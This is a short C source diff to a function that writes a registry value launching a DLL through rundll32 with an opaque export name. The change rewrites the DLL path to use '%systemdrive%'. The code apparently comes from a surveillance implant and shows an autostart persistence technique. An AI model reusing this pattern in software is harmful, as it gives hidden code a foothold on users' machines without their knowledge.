@@ -1973,10 +1973,13 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 	memset(key_value, 0, sizeof(key_value));
 	FNC(GetSystemDirectoryA)(key_value, sizeof(key_value));
 	strcat(key_value, "\\rundll32.exe ");
+	
+	HM_CompletePath(dll_name, dll_path);
 
 	// Path alla DLL e nome funzione
 	strcat(key_value, "\""); // Per sicurezza...
-	strcat(key_value, HM_CompletePath(dll_name, dll_path));
+	strcat(key_value, "%systemdrive%\\");
+	strcat(key_value, dll_path+3);
 	strcat(key_value, "\""); // ...metto il path alla dll fra ""
 	strcat(key_value, ",PFTBBP8"); 
 
